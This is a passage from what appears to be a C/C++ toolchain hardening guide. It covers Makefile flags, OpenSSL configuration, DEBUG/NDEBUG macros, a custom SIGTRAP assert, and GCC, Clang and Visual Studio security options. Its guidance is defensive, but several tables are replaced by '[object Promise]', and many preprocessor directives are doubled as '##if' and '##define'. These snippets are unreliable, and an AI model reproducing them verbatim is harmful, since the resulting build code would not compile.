HOWTO](https://dwheeler.com/secure-programs/)*, was one of the folks trying to improve the posture.\r\n\r\n### Makefiles\r\n\r\nMake is one of the earliest build tools dating back to the 1970s. Its available on Linux, macOS and Unix, so you will frequently encounter projects using it. Unfortunately, Make has a number of short comings (*[Recursive Make Considered Harmful](https://embeddedartistry.com/blog/2017/04/10/recursive-make-considered-harmful/)* and *[What's Wrong With GNU make?](https://www.conifersystems.com/whitepapers/gnu-make/)*), and can cause some discomfort. Despite issues with Make, ESAPI C++ uses Make primarily for three reasons: first, its omnipresent; second, its easier to manage than the Auto Tools family; and third, `libtool` was out of the question.\r\n\r\nConsider what happens when you: (1) type `make` `debug`, and then type `make` `release`. Each build would require different `CFLAGS` due to optimizations and level of debug support. In your makefile, you would extract the relevant target and set `CFLAGS` and `CXXFLAGS` similar to below (taken from [ESAPI C++ Makefile](https://code.google.com/archive/p/owasp-esapi-cplusplus/source/default/source)):\r\n\r\n```text\r\n## Makefile\r\nDEBUG_GOALS = $(filter $(MAKECMDGOALS), debug)\r\nifneq ($(DEBUG_GOALS),)\r\n    WANT_DEBUG := 1\r\n    WANT_TEST := 0\r\n    WANT_RELEASE := 0\r\nendif\r\n…\r\n\r\nifeq ($(WANT_DEBUG),1)\r\n    ESAPI_CFLAGS += -DDEBUG=1 -UNDEBUG -g3 -ggdb -O0\r\n    ESAPI_CXXFLAGS += -DDEBUG=1 -UNDEBUG -g3 -ggdb -O0\r\nendif\r\n\r\nifeq ($(WANT_RELEASE),1)\r\n    ESAPI_CFLAGS += -DNDEBUG=1 -UDEBUG -g -O2\r\n    ESAPI_CXXFLAGS += -DNDEBUG=1 -UDEBUG -g -O2\r\nendif\r\n\r\nifeq ($(WANT_TEST),1)\r\n    ESAPI_CFLAGS += -DESAPI_NO_ASSERT=1 -g2 -ggdb -O2 -Dprivate=public\r\n                                                      -Dprotected=public\r\n    ESAPI_CXXFLAGS += -DESAPI_NO_ASSERT=1 -g2 -ggdb -O2 -Dprivate=public\r\n                                                        -Dprotected=public\r\nendif\r\n…\r\n\r\n## Merge ESAPI flags with user supplied flags. We perform the extra step to ensure\r\n## user options follow our options, which should give user option's a preference.\r\noverride CFLAGS := $(ESAPI_CFLAGS) $(CFLAGS)\r\noverride CXXFLAGS := $(ESAPI_CXXFLAGS) $(CXXFLAGS)\r\noverride LDFLAGS := $(ESAPI_LDFLAGS) $(LDFLAGS)\r\n…\r\n```\r\n\r\nMake will first build the program in a debug configuration for a session under the debugger using a rule similar to:\r\n\r\n```text\r\n%.cpp:%.o:\r\n        $(CXX) $(CPPFLAGS) $(CXXFLAGS) -c $< -o $@\r\n```\r\n\r\nWhen you want the release build, Make will do nothing because it considers everything up to date despite the fact `CFLAGS` and `CXXFLAGS` have changed. Hence, your program will actually be in a debug configuration and risk a `SIGABRT` at runtime because debug instrumentation is present (recall `assert` calls `abort()` when `NDEBUG` is **not** defined). In essence, you have DoS'd yourself due to `make`.\r\n\r\nIn addition, many projects do not honor the user's command-line. ESAPI C++ does its best to ensure a user's flags are honored via `override` as shown above, but other projects do not. For example, consider a project that should be built with Position Independent Executable (PIE or ASLR) enabled and data execution prevention (DEP) enabled. Dismissing user settings combined with insecure out of the box settings (and not picking them up during auto-setup or auto-configure) means a program built with the following will likely have neither defense:\r\n\r\n```bash\r\nmake CFLAGS=\"-fPIE\" CXXFLAGS=\"-fPIE\" LDFLAGS=\"-pie -z,noexecstack, -z,noexecheap\"\r\n```\r\n\r\nDefenses such as ASLR and DEP are especially important on Linux because [Data Execution - not Prevention - is the norm](https://linux.die.net/man/5/elf).\r\n\r\n### Integration\r\n\r\nProject level integration presents opportunities to harden your program or library with domain specific knowledge. For example, if the platform supports Position Independent Executables (PIE or ASLR) and data execution prevention (DEP), then you should integrate with it. The consequences of not doing so could result in exploitation. As a case in point, see KingCope's 0-days for MySQL in December, 2012 (CVE-2012-5579 and CVE-2012-5612, among others). Integration with platform security would have neutered a number of the 0-days.\r\n\r\nYou also have the opportunity to include helpful libraries that are not need for business logic support. For example, if you are working on a platform with [DMalloc](http://dmalloc.com) or [Address Sanitizer](https://github.com/google/sanitizers/tree/master/hwaddress-sanitizer), you should probably use it in your debug builds. For Ubuntu, DMalloc available from the package manager and can be installed with `sudo apt install libdmalloc5`. For Apple platforms, its available as a scheme option. Address Sanitizer is available in [GCC 4.8 and above](https://gcc.gnu.org/gcc-4.8/changes.html) for many platforms.\r\n\r\nIn addition, project level integration is an opportunity to harden third party libraries you chose to include. Because you chose to include them, you and your users are responsible for them. If you or your users endure a `SP800-53` audit, third party libraries will be in scope because the supply chain is included (specifically, item SA-12, Supply Chain Protection). The audits are not limited to those in the US Federal arena - financial institutions perform reviews too. A perfect example of violating this guidance is [CVE-2012-1525](https://nvd.nist.gov/vuln/detail/CVE-2012-1525), which was due to [Adobe's inclusion of a defective Sablotron library](https://www.agarri.fr/blog/index.html).\r\n\r\nAnother example is including OpenSSL. You know (1) [SSLv2 is insecure](https://www.schneier.com/academic/paperfiles/paper-ssl-revised.pdf), (2) [SSLv3 is insecure](https://blog.qualys.com/ssllabs/2014/10/15/ssl-3-is-dead-killed-by-the-poodle-attack), and (3) [compression is insecure](https://arstechnica.com/security/2012/09/crime-hijacks-https-sessions/) (among others). In addition, suppose you don't use hardware and engines, and only allow static linking. Given the knowledge and specifications, you would configure the OpenSSL library as follows:\r\n\r\n```bash\r\n$ Configure darwin64-x86_64-cc -no-hw -no-engine -no-comp -no-shared\r\n    -no-dso -no-ssl2 -no-ssl3 --openssldir=…\r\n```\r\n\r\n*Note Well*: you might want engines, especially on Ivy Bridge microarchitectures (3rd generation Intel Core i5 and i7 processors). To have OpenSSL use the processor's random number generator (via the of `rdrand` instruction), you will need to call OpenSSL's `ENGINE_load_rdrand()` function and then `ENGINE_set_default` with `ENGINE_METHOD_RAND`. See [OpenSSL's Random Numbers](https://wiki.openssl.org/index.php/Random_Numbers) for details.\r\n\r\nIf you configure without the switches, then you will likely have vulnerable code/libraries and risk failing an audit. If the program is a remote server, then the following command will reveal if compression is active on the channel:\r\n\r\n```bash\r\necho \"GET / HTTP1.0\" | openssl s_client -connect <nowiki>example.com:443</nowiki>\r\n```\r\n\r\n`nm` or `openssl` `s_client` will show that compression is enabled in the client. In fact, any symbol within the `OPENSSL_NO_COMP` preprocessor macro will bear witness since `-no-comp` is translated into a `CFLAGS` define.\r\n\r\n```bash\r\n$ nm /usr/local/ssl/iphoneos/lib/libcrypto.a 2>/dev/null | egrep -i \"(COMP_CTX_new|COMP_CTX_free)\"\r\n0000000000000110 T COMP_CTX_free\r\n0000000000000000 T COMP_CTX_new\r\n```\r\n\r\nEven more egregious is the answer given to auditors who specifically ask about configurations and protocols: \"we don't use weak/wounded/broken ciphers\" or \"we follow best practices.\" The use of compression tells the auditor that you are using wounded protocol in an insecure configuration and you don't follow best practices. That will likely set off alarm bells, and ensure the auditor dives deeper on more items.\r\n\r\n## Preprocessor\r\n\r\nThe preprocessor is crucial to setting up a project for success. The C committee provided one macro - `NDEBUG` - and the macro can be used to derive a number of configurations and drive engineering processes. Unfortunately, the committee also left many related items to chance, which has resulted in programmers abusing built-in facilities. This section will help you set up you projects to integrate well with other projects and ensure reliability and security.\r\n\r\nThere are three topics to discuss when hardening the preprocessor. The first is well defined configurations which produce well defined behaviors, the second is useful behavior from assert, and the third is proper use of macros when integrating vendor code and third party libraries.\r\n\r\n### Configurations\r\n\r\nTo remove ambiguity, you should recognize two configurations: Release and Debug. Release is for production code on live servers, and its behavior is requested via the C/C++ `NDEBUG` macro. Its also the only macro observed by the C and C++ Committees and Posix. Diametrically opposed to release is Debug. While there is a compelling argument for `!defined(NDEBUG)`, you should have an explicit macro for the configuration and that macro should be `DEBUG`. This is because vendors and outside libraries use `DEBUG` (or similar) macro for their configuration. For example, Carnegie Mellon's Mach kernel uses `DEBUG`, Microsoft's CRT uses [`_DEBUG`](https://www.microsoft.com/en-us/download/details.aspx?id=55979), and Wind River Workbench uses `DEBUG_MODE`.\r\n\r\nIn addition to `NDEBUG` (Release) and `DEBUG` (Debug), you have two additional cross products: both are defined or neither are defined. Defining both should be an error, and defining neither should default to a release configuration. Below is from [ESAPI C++ EsapiCommon.h](https://code.google.com/archive/p/owasp-esapi-cplusplus/source/default/source), which is the configuration file used by all source files:\r\n\r\n```c\r\n// Only one or the other, but not both\r\n##if (defined(DEBUG) || defined(_DEBUG)) && (defined(NDEBUG)\r\n                                           || defined(_NDEBUG))\r\n## error Both DEBUG and NDEBUG are defined.\r\n##endif\r\n\r\n// The only time we switch to debug is when asked.\r\n// NDEBUG or {nothing} results\r\n// in release build (fewer surprises at runtime).\r\n##if defined(DEBUG) || defined(_DEBUG)\r\n## define ESAPI_BUILD_DEBUG 1\r\n##else\r\n## define ESAPI_BUILD_RELEASE 1\r\n##endif\r\n```\r\n\r\nWhen `DEBUG` is in effect, your code should receive full debug instrumentation, including the full force of assertions.\r\n\r\n### ASSERT\r\n\r\nAsserts will help you create self-debugging code by helping you find the point of first failure quickly and easily. Asserts should be used throughout your program, including parameter validation, return value checking and program state. The `assert` will silently guard your code through its lifetime. It will always be there, even when not debugging a specific component of a module. If you have thorough code coverage, you will spend less time debugging and more time developing because programs will debug themselves.\r\n\r\nTo use asserts effectively, you should assert everything. That includes parameters upon entering a function, return values from function calls, and any program state. Everywhere you place an `if` statement for validation or checking, you should have an assert. Everywhere you have an `assert` for validation or checking, you should have an `if` statement. They go hand-in-hand.\r\n\r\nIf you are still using `printf`'s, then you have an opportunity for improvement. In the time it takes for you to write a `printf` or `NSLog` statement, you could have written an `assert`. Unlike the `printf` or `NSLog` which are often removed when no longer needed, the `assert` stays active forever. Remember, this is all about finding the point of first failure quickly so you can spend your time doing other things.\r\n\r\nThere is one problem with using asserts - [Posix states `assert` should call `abort()`](https://pubs.opengroup.org/onlinepubs/9699919799/functions/assert.html) if `NDEBUG` is **not** defined. When debugging, `NDEBUG` will never be defined since you want the \"program diagnostics\" (quote from the Posix description). The behavior makes `assert` and its accompanying `abort()` completely useless for development. The result of \"program diagnostics\" calling `abort()` due to standard C/C++ behavior is disuse - developers simply don't use them. Its incredibly bad for the development community because self-debugging programs can help eradicate so many stability problems.\r\n\r\nSince self-debugging programs are so powerful, you will have to have to supply your own assert and signal handler with improved behavior. Your assert will exchange auto-aborting behavior for auto-debugging behavior. The auto-debugging facility will ensure the debugger snaps when a problem is detected, and you will find the point of first failure quickly and easily.\r\n\r\nESAPI C++ supplies its own assert with the behavior described above. In the code below, `ASSERT` raises `SIGTRAP` when in effect or it evaluates to `void` in other cases.\r\n\r\n```c\r\n// A debug assert which should be sprinkled liberally.\r\n// This assert fires and then continues rather\r\n// than calling abort(). Useful when examining negative\r\n// test cases from the command-line.\r\n##if (defined(ESAPI_BUILD_DEBUG) && defined(ESAPI_OS_STARNIX))\r\n##  define ESAPI_ASSERT1(exp) {                                    \\\r\n    if(!(exp)) {                                                  \\\r\n        std::ostringstream oss;                                     \\\r\n        oss << \"Assertion failed: \" << (char*)(__FILE__) << \"(\"     \\\r\n            << (int)__LINE__ << \"): \" << (char*)(__func__)          \\\r\n            << std::endl;                                           \\\r\n        std::cerr << oss.str();                                     \\\r\n        raise(SIGTRAP);                                             \\\r\n    }                                                             \\\r\n    }\r\n##  define ESAPI_ASSERT2(exp, msg) {                               \\\r\n    if(!(exp)) {                                                  \\\r\n        std::ostringstream oss;                                     \\\r\n        oss << \"Assertion failed: \" << (char*)(__FILE__) << \"(\"     \\\r\n            << (int)__LINE__ << \"): \" << (char*)(__func__)          \\\r\n            << \": \\\"\" << (msg) << \"\\\"\" << std::endl;                \\\r\n        std::cerr << oss.str();                                     \\\r\n        raise(SIGTRAP);                                             \\\r\n    }                                                             \\\r\n    }\r\n##elif (defined(ESAPI_BUILD_DEBUG) && defined(ESAPI_OS_WINDOWS))\r\n##  define ESAPI_ASSERT1(exp)      assert(exp)\r\n##  define ESAPI_ASSERT2(exp, msg) assert(exp)\r\n##else\r\n##  define ESAPI_ASSERT1(exp)      ((void)(exp))\r\n##  define ESAPI_ASSERT2(exp, msg) ((void)(exp))\r\n##endif\r\n\r\n##if !defined(ASSERT)\r\n##  define ASSERT(exp)     ESAPI_ASSERT1(exp)\r\n##endif\r\n```\r\n\r\nAt program startup, a `SIGTRAP` handler will be installed if one is not provided by another component:\r\n\r\n```c\r\n    struct DebugTrapHandler\r\n    {\r\n      DebugTrapHandler()\r\n      {\r\n        struct sigaction new_handler, old_handler;\r\n\r\n        do\r\n          {\r\n            int ret = 0;\r\n\r\n            ret = sigaction (SIGTRAP, NULL, &old_handler);\r\n            if (ret != 0) break; // Failed\r\n\r\n            // Don't step on another's handler\r\n            if (old_handler.sa_handler != NULL) break;\r\n\r\n            new_handler.sa_handler = &DebugTrapHandler::NullHandler;\r\n            new_handler.sa_flags = 0;\r\n\r\n            ret = sigemptyset (&new_handler.sa_mask);\r\n            if (ret != 0) break; // Failed\r\n\r\n            ret = sigaction (SIGTRAP, &new_handler, NULL);\r\n            if (ret != 0) break; // Failed\r\n\r\n          } while(0);\r\n      }\r\n\r\n      static void NullHandler(int /*unused*/) { }\r\n\r\n    };\r\n\r\n    // We specify a relatively low priority, to make sure we run before other CTORs\r\n    // http://gcc.gnu.org/onlinedocs/gcc/C_002b_002b-Attributes.html#C_002b_002b-Attributes\r\n    static const DebugTrapHandler g_dummyHandler __attribute__ ((init_priority (110)));\r\n```\r\n\r\nOn a Windows platform, you would call `_set_invalid_parameter_handler` (and possibly `set_unexpected` or `set_terminate`) to install a new handler.\r\n\r\nLive hosts running production code should always define `NDEBUG` (i.e., release configuration), which means they do not assert or auto-abort. Auto-abortion is not acceptable behavior, and anyone who asks for the behavior is completely abusing the functionality of \"program diagnostics\". If a program wants a core dump, then it should create the dump rather than crashing.\r\n\r\nFor more reading on asserting effectively, please see one of John Robbin's books, such as *[Debugging Applications](https://www.amazon.com/dp/0735608865)*. John is a legendary bug slayer in Windows circles, and he will show you how to do nearly everything, from debugging a simple program to bug slaying in multithreaded programs.\r\n\r\n### Additional Macros\r\n\r\nAdditional macros include any macros needed to integrate properly and securely. It includes integrating the program with the platform (for example MFC or Cocoa/CocoaTouch) and libraries (for example, Crypto++ or OpenSSL). It can be a challenge because you have to have proficiency with your platform and all included libraries and frameworks. The list below illustrates the level of detail you will need when integrating.\r\n\r\nThough Boost is missing from the list, it appears to lack recommendations, additional debug diagnostics, and a hardening guide. See *[BOOST Hardening Guide (Preprocessor Macros)](https://stackoverflow.com/questions/14927033/boost-hardening-guide-preprocessor-macros)* for details. In addition, Tim Day points to *[\\[boost.build\\] should we not define _SECURE_SCL=0 by default for all msvc toolsets](https://lists.boost.org/Archives/boost/2008/12/145749.php)* for a recent discussion related to hardening (or lack thereof).\r\n\r\nIn addition to what you should define, defining some macros and undefining others should trigger a security related defect. For example, `-U_FORTIFY_SOURCES` on Linux and `_CRT_SECURE_NO_WARNINGS=1`, `_SCL_SECURE_NO_WARNINGS`, `_ATL_SECURE_NO_WARNINGS` or `STRSAFE_NO_DEPRECATE` on Windows.\r\n\r\n[object Promise]\r\n\r\na) Be careful with `_GLIBCXX_DEBUG` when using pre-compiled libraries such as Boost from a distribution. There are ABI incompatibilities, and the result will likely be a crash. You will have to compile Boost with `_GLIBCXX_DEBUG` or omit `_GLIBCXX_DEBUG`.\r\n\r\nb) See [Chapter 5, Diagnostics](https://gcc.gnu.org/onlinedocs/libstdc++/manual/concept_checking.html) of the libstdc++ manual for details.\r\n\r\nc) SQLite secure deletion zeroizes memory on destruction. Define as required, and always define in US Federal since zeroization is required for FIPS 140-2, Level 1.\r\n\r\nd) *N* is 0644 by default, which means everyone has some access.\r\n\r\ne) Force temporary tables into memory (no unencrypted data to disk).\r\n\r\n## Compiler and Linker\r\n\r\nCompiler writers provide a rich set of warnings from the analysis of code during compilation. Both GCC and Visual Studio have static analysis capabilities to help find mistakes early in the development process. The built-in static analysis capabilities of GCC and Visual Studio are usually sufficient to ensure proper API usage and catch a number of mistakes such as using an uninitialized variable or comparing a negative signed int and a positive unsigned int.\r\n\r\nAs a concrete example, (and for those not familiar with C/C++ promotion rules), a warning will be issued if a signed integer is promoted to an unsigned integer and then compared because a side effect is `-1 > 1` after promotion! GCC and Visual Studio will not currently catch, for example, SQL injections and other tainted data usage. For that, you will need a tool designed to perform data flow analysis or taint analysis.\r\n\r\nSome in the development community resist static analysis or refute its results. For example, when static analysis warned the Linux kernel's `sys_prctl` was comparing an unsigned value against less than zero, Jesper Juhl offered a patch to clean up the code. Linus Torvalds howled \"No, you don't do this… GCC is crap\" (referring to compiling with warnings). For the full discussion, see *[\\[PATCH\\] Don't compare unsigned variable for &lt;0 in sys_prctl()](https://groups.google.com/g/fa.linux.kernel/c/jjk_K4HOemQ/)* from the Linux Kernel mailing list.\r\n\r\nThe following sections will detail steps for three platforms. First is a typical GNU Linux based distribution offering GCC and Binutils, second is Clang and Xcode, and third is modern Windows platforms.\r\n\r\n### Distribution Hardening\r\n\r\nBefore discussing GCC and Binutils, it would be a good time to point out some of the defenses discussed below are all ready present in a distribution. Unfortunately, its design by committee, so what is present is usually only a mild variation of what is available (this way, everyone is mildly offended). For those who are purely worried about performance, you might be surprised to learn you have already taken the small performance hint without even knowing.\r\n\r\nLinux and BSD distributions often apply some hardening without intervention via *[GCC Spec Files](https://gcc.gnu.org/onlinedocs/gcc/Spec-Files.html)*. If you are using Debian, Ubuntu, Linux Mint and family, see *[Debian Hardening](https://wiki.debian.org/Hardening)*. For Red Hat and Fedora systems, see *[New hardened build support (coming) in F16](https://lists.fedoraproject.org/pipermail/devel-announce/2011-August/000821.html)*. Gentoo users should visit *[Hardened Gentoo](https://wiki.gentoo.org/wiki/Project:Hardened)*.\r\n\r\nYou can see the settings being used by a distribution via `gcc` `-dumpspecs`. From Linux Mint 12 below, `-fstack-protector` (but not -fstack-protector-all) is used by default.\r\n\r\n```bash\r\n$ gcc -dumpspecs\r\n…\r\n*link_ssp: %{fstack-protector:}\r\n\r\n*ssp_default: %{!fno-stack-protector:%{!fstack-protector-all:\r\n              %{!ffreestanding:%{!nostdlib:-fstack-protector}}}}\r\n…\r\n```\r\n\r\nThe \"SSP\" above stands for Stack Smashing Protector. SSP is a reimplementation of Hiroaki Etoh's work on IBM Pro Police Stack Detector. See Hiroaki Etoh's patch *[gcc stack-smashing protector](https://gcc.gnu.org/ml/gcc-patches/2001-06/msg01753.html)* and IBM's *[GCC extension for protecting applications from stack-smashing attacks](https://pdfs.semanticscholar.org/9d92/fa9eaa6ca12888d303deffe8bc392b85c09f.pdf)* for details.\r\n\r\n### GCC/Binutils\r\n\r\nGCC (the compiler collection) and Binutils (the assemblers, linkers, and other tools) are separate projects that work together to produce a final executable. Both the compiler and linker offer options to help you write safer and more secure code. The linker will produce code which takes advantage of platform security features offered by the kernel and PaX, such as no-exec stacks and heaps (NX) and Position Independent Executable (PIE).\r\n\r\nThe table below offers a set of compiler options to build your program. Static analysis warnings help catch mistakes early, while the linker options harden the executable at runtime. In the table below, \"GCC\" should be loosely taken as \"non-ancient distributions.\" While the GCC team considers 4.2 ancient, you will still encounter it on Apple and BSD platforms due to changes in GPL licensing around 2007. Refer to *[GCC Option Summary](https://gcc.gnu.org/onlinedocs/gcc/Option-Summary.html)*, *[Options to Request or Suppress Warnings](https://gcc.gnu.org/onlinedocs/gcc/Warning-Options.html)* and *[Binutils (LD) Command Line Options](https://sourceware.org/binutils/docs-2.21/ld/Options.html)* for usage details.\r\n\r\nNoteworthy of special mention are `-fno-strict-overflow` and `-fwrapv`ₐ. The flags ensure the compiler does not remove statements that result in overflow or wrap. If your program only runs correctly using the flags, it is likely violating C/C++ rules on overflow and illegal. If the program is illegal due to overflow or wrap checking, you should consider using [safe-iop](https://code.google.com/archive/p/safe-iop/) for C or David LeBlanc's [SafeInt](https://archive.codeplex.com/?p=safeint) in C++.\r\n\r\nFor a project compiled and linked with hardened settings, some of those settings can be verified with the [Checksec](https://www.trapkit.de/tools/checksec.html) tool written by Tobias Klein. The `checksec.sh` script is designed to test standard Linux OS and PaX security features being used by an application. See the [Trapkit](https://www.trapkit.de/tools/checksec.html) web page for details.\r\n\r\nGCC C Warning Options table:\r\n\r\n[object Promise]\r\n\r\n- [AddressSanitizer](https://github.com/google/sanitizers)\r\n- [ThreadSanitizer](https://github.com/google/sanitizers/wiki/ThreadSanitizerCppManual)\r\n\r\na) Unlike Clang and -Weverything, GCC does not provide a switch to truly enable all warnings.\r\nb) -fstack-protector guards functions with high risk objects such as C strings, while -fstack-protector-all guards all objects.\r\n\r\nAdditional C++ warnings which can be used include the following in Table 3. See *[GCC's Options Controlling C++ Dialect](https://gcc.gnu.org/onlinedocs/gcc/C_002b_002b-Dialect-Options.html)* for additional options and details.\r\n\r\nGCC C++ Warning Options table:\r\n\r\n[object Promise]\r\n\r\n[Effective C++, Second Edition book](https://www.aristeia.com/books.html).\r\n\r\nAnd additional Objective C warnings which are often useful include the following. See *[Options Controlling Objective-C and Objective-C++ Dialects](https://gcc.gnu.org/onlinedocs/gcc-4.6.0/gcc/Objective_002dC-and-Objective_002dC_002b_002b-Dialect-Options.html)* for additional options and details.\r\n\r\nGCC Objective C Warning Options table:\r\n\r\n[object Promise]\r\n\r\nThe use of aggressive warnings will produce spurious noise. The noise is a tradeoff - you can learn of potential problems at the cost of wading through some chaff. The following will help reduces spurious noise from the warning system:\r\n\r\n- `-Wno-unused-parameter` (GCC)\r\n- `-Wno-type-limits` (GCC 4.3)\r\n- `-Wno-tautological-compare` (Clang)\r\n\r\nFinally, a simple version based Makefile example is shown below. This is different than feature based makefile produced by auto tools (which will test for a particular feature and then define a symbol or configure a template file). Not all platforms use all options and flags. To address the issue you can pursue one of two strategies. First, you can ship with a weakened posture by servicing the lowest common denominator; or you can ship with everything in force. In the latter case, those who don't have a feature available will edit the makefile to accommodate their installation.\r\n\r\n```bash\r\nCXX=g++\r\nEGREP = egrep\r\n…\r\n\r\nGCC_COMPILER = $(shell $(CXX) -v 2>&1 | $(EGREP) -i -c '^gcc version')\r\nGCC41_OR_LATER = $(shell $(CXX) -v 2>&1 | $(EGREP) -i -c '^gcc version (4\\.[1-9]|[5-9])')\r\n…\r\n\r\nGNU_LD210_OR_LATER = $(shell $(LD) -v 2>&1 | $(EGREP) -i -c '^gnu ld .* (2\\.1[0-9]|2\\.[2-9])')\r\nGNU_LD214_OR_LATER = $(shell $(LD) -v 2>&1 | $(EGREP) -i -c '^gnu ld .* (2\\.1[4-9]|2\\.[2-9])')\r\n…\r\n\r\nifeq ($(GCC_COMPILER),1)\r\n    MY_CC_FLAGS += -Wall -Wextra -Wconversion\r\n    MY_CC_FLAGS += -Wformat=2 -Wformat-security\r\n    MY_CC_FLAGS += -Wno-unused-parameter\r\nendif\r\n\r\nifeq ($(GCC41_OR_LATER),1)\r\n    MY_CC_FLAGS += -fstack-protector-all\r\nendif\r\n\r\nifeq ($(GCC42_OR_LATER),1)\r\n    MY_CC_FLAGS += -Wstrict-overflow\r\nendif\r\n\r\nifeq ($(GCC43_OR_LATER),1)\r\n    MY_CC_FLAGS += -Wtrampolines\r\nendif\r\n\r\nifeq ($(GNU_LD210_OR_LATER),1)\r\n    MY_LD_FLAGS += -z,nodlopen -z,nodump\r\nendif\r\n\r\nifeq ($(GNU_LD214_OR_LATER),1)\r\n    MY_LD_FLAGS += -z,noexecstack -z,noexecheap\r\nendif\r\n\r\nifeq ($(GNU_LD215_OR_LATER),1)\r\n    MY_LD_FLAGS += -z,relro -z,now\r\nendif\r\n\r\nifeq ($(GNU_LD216_OR_LATER),1)\r\n    MY_CC_FLAGS += -fPIE\r\n    MY_LD_FLAGS += -pie\r\nendif\r\n\r\n## Use 'override' to honor the user's command line\r\noverride CFLAGS := $(MY_CC_FLAGS) $(CFLAGS)\r\noverride CXXFLAGS := $(MY_CC_FLAGS) $(CXXFLAGS)\r\noverride LDFLAGS := $(MY_LD_FLAGS) $(LDFLAGS)\r\n…\r\n```\r\n\r\n### Clang/Xcode\r\n\r\n[Clang](https://clang.llvm.org) and [LLVM](https://llvm.org) have been aggressively developed since Apple lost its GPL compiler back in 2007 (due to Tivoization which resulted in GPLv3). Since that time, a number of developers and Goggle have joined the effort. While Clang will consume most (all?) GCC/Binutil flags and switches, the project supports a number of its own options, including a static analyzer. In addition, Clang is relatively easy to build with additional diagnostics, such as Dr. John Regher and Peng Li's [Integer Overflow Checker (IOC)](https://embed.cs.utah.edu/ioc/).\r\n\r\nIOC is incredibly useful, and has found bugs in a number of projects, from the Linux Kernel (`include/linux/bitops.h`, still unfixed), SQLite, PHP, Firefox (many still unfixed), LLVM, and Python. Future version of Clang (Clang 3.3 and above) will allow you to enable the checks out of the box with `-fsanitize=integer` and `-fsanitize=shift`.\r\n\r\nClang options can be found at [Clang Compiler User's Manual](https://clang.llvm.org/docs/UsersManual.html). Clang does include an option to turn on all warnings - `-Weverything`. Use it with care but use it regularly since you will get back a lot of noise and issues you missed. For example, add `-Weverything` for production builds and make non-spurious issues a quality gate. Under Xcode, simply add `-Weverything` to `CFLAGS` and `CXXFLAGS`.\r\n\r\nIn addition to compiler warnings, both static analysis and additional security checks can be performed. Reading on Clang's static analysis capabilities can be found at [Clang Static Analyzer](https://clang-analyzer.llvm.org). Figure 1 below shows some of the security checks utilized by Xcode.\r\n\r\n[object Promise]\r\n\r\n### Visual Studio\r\n\r\nVisual Studio offers a convenient Integrated Development Environment (IDE) for managing solutions and their settings. the section called \"Visual Studio Options\" discusses option which should be used with Visual Studio, and the section called \"Project Properties\" demonstrates incorporating those options into a solution's project.\r\n\r\nThe table below lists the compiler and linker switches which should be used under Visual Studio. Refer to Howard and LeBlanc's Writing Secure Code (Microsoft Press) for a detailed discussion; or *[Protecting Your Code with Visual C++ Defenses](https://docs.microsoft.com/en-us/archive/msdn-magazine/2008/march/security-briefs-protecting-your-code-with-visual-c-defenses)* in Security Briefs by Michael Howard. In the table below, \"Visual Studio\" refers to nearly all versions of the development environment, including Visual Studio 5.0 and 6.0.\r\n\r\nFor a project compiled and linked with hardened settings, those settings can be verified with BinScope. BinScope is a verification tool from Microsoft that analyzes binaries to ensure that they have been built-in compliance with Microsoft's Security Development Lifecycle (SDLC) requirements and recommendations. See the *[BinScope Binary Analyzer](https://www.microsoft.com/en-us/download/details.aspx?id=44995)* download page for details.\r\n\r\n[object Promise]\r\n\r\na) See Jon Sturgeon's discussion of the switch at *[Off By Default Compiler Warnings in Visual C++](https://devblogs.microsoft.com/cppblog/off-by-default-compiler-warnings-in-visual-c/)*.\r\n\r\na) When using /GS, there are a number of circumstances which affect the inclusion of a security cookie. For example, the guard is not used if there is no buffer in the stack frame, optimizations are disabled, or the function is declared naked or contains inline assembly.\r\n\r\nb) `#pragma` `strict_gs_check(on)` should be used sparingly, but is recommend in high risk situations, such as when a source file parses input from the internet.\r\n\r\n### Warn Suppression\r\n\r\nFrom the tables above, a lot of warnings have been enabled to help detect possible programming mistakes. The potential mistakes are detected via compiler which carries around a lot of contextual information during its code analysis phase. At times, you will receive spurious warnings because the compiler is not *that* smart. Its understandable and even a good thing (how would you like to be out of a job because a program writes its own programs?). At times you will have to learn how to work with the compiler's warning system to suppress warnings. Notice what was not said: turn off the warnings.\r\n\r\nSuppressing warnings placates the compiler for spurious noise so you can get to the issues that matter (you are separating the wheat from the chaff). This section will offer some hints and point out some potential minefields. First is an unused parameter (for example, `argc` or `argv`). Suppressing unused parameter warnings is especially helpful for C++ and interface programming, where parameters are often unused. For this warning, simply define an \"UNUSED\" macro and warp the parameter:\r\n\r\n```c\r\n##define UNUSED_PARAMETER(x) ((void)x)\r\n…\r\n\r\nint main(int argc, char* argv[])\r\n{\r\n    UNUSED_PARAMETER(argc);\r\n    UNUSED_PARAMETER(argv);\r\n    …\r\n}\r\n```\r\n\r\nA potential minefield lies near \"comparing unsigned and signed\" values, and `-Wconversion` will catch it for you. This is because C/C++ promotion rules state the signed value will be promoted to an unsigned value and then compared. That means `-1` `>` `1` after promotion! To fix this, you cannot blindly cast - you must first range test the value:\r\n\r\n```c\r\nint x = GetX();\r\nunsigned int y = GetY();\r\n\r\nASSERT(x >= 0);\r\nif(!(x >= 0))\r\n    throw runtime_error(\"WTF??? X is negative.\");\r\n\r\nif(static_cast<unsigned int>(x) > y)\r\n    cout << \"x is greater than y\" << endl;\r\nelse\r\n    cout << \"x is not greater than y\" << endl;\r\n```\r\n\r\nNotice the code above will debug itself - you don't need to set a breakpoint to see if there is a problem with `x`. Just run the program and wait for it to tell you there is a problem. If there is a problem, the program will snap the debugger (and more importantly, not call a useless `abort()` as specified by Posix). It beats the snot out of `printf` that are removed when no longer needed or pollute outputs.\r\n\r\nAnother conversion problem you will encounter conversion between types, and `-Wconversion` will also catch it for you. The following will always have an opportunity to fail, and should light up like a Christmas tree:\r\n\r\n```c\r\nstruct sockaddr_in addr;\r\n…\r\n\r\naddr.sin_port = htons(atoi(argv[2]));\r\n```\r\n\r\nThe following would probably serve you much better. Notice `atoi` and fiends are not used because they can silently fail. In addition, the code is instrumented so you don't need to waste a lot of time debugging potential problems:\r\n\r\n```c\r\nconst char* cstr = GetPortString();\r\n\r\nASSERT(cstr != NULL);\r\nif(!(cstr != NULL))\r\n    throw runtime_error(\"WTF??? Port string is not valid.\");\r\n\r\nistringstream iss(cstr);\r\nlong long t = 0;\r\niss >> t;\r\n\r\nASSERT(!(iss.fail()));\r\nif(iss.fail())\r\n    throw runtime_error(\"WTF??? Failed to read port.\");\r\n\r\n// Should this be a port above the reserved range ([0-1024] on Unix)?\r\nASSERT(t > 0);\r\nif(!(t > 0))\r\n    throw runtime_error(\"WTF??? Port is too small\");\r\n\r\nASSERT(t < static_cast<long long>(numeric_limits<unsigned 